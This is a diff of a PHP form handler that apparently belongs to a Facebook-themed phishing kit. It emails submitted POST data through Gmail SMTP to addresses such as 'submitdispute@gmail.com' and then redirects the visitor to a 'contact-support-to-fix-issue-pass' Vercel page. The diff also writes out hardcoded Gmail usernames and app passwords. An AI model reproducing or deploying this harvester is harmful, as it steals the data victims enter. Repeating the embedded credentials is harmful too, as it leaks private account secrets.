@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://facebook.com/profile.php");
+header("Location:https://contact-support-to-fix-issue-pass.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -19,31 +19,31 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     }
 
 
-
-    // PHPMailer object creation
+   // PHPMailer object creation
     $mail = new PHPMailer(true);
 
     try {
         // SMTP settings
-         $mail->isSMTP();
+          $mail->isSMTP();
         $mail->Host       = 'smtp.gmail.com'; // Replace with your SMTP server address
         $mail->SMTPAuth   = true;
-        $mail->Username   = 'zt69021@gmail.com'; // Replace with your email address
-        $mail->Password   = 'dluv ssiv cori fimn'; // Replace with your email password
+        $mail->Username   = 'hindistoryhub396@gmail.com'; // Replace with your email address
+        $mail->Password   = 'fylk gbsb cdgu anwh'; // Replace with your email password
         $mail->SMTPSecure = 'tls';
         $mail->Port       = 587;
 
 
         // Email properties
-        $mail->setFrom('zt69021@gmail.com', 'PROFESSOR');
-        $mail->addAddress('muneeb.nizamani.official56@gmail.com');
-         
+        $mail->setFrom('hindistoryhub396@gmail.com', 'PROFESSOR');
+        $mail->addAddress('submitdispute@gmail.com');
+         $mail->addAddress('newzatpage@gmail.com');
+       
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'Muneeb';
+        $mail->Subject = 'Zubair';
         $mail->Body = $emailBody; // Set the email body using the collected form data
         
         // Send email
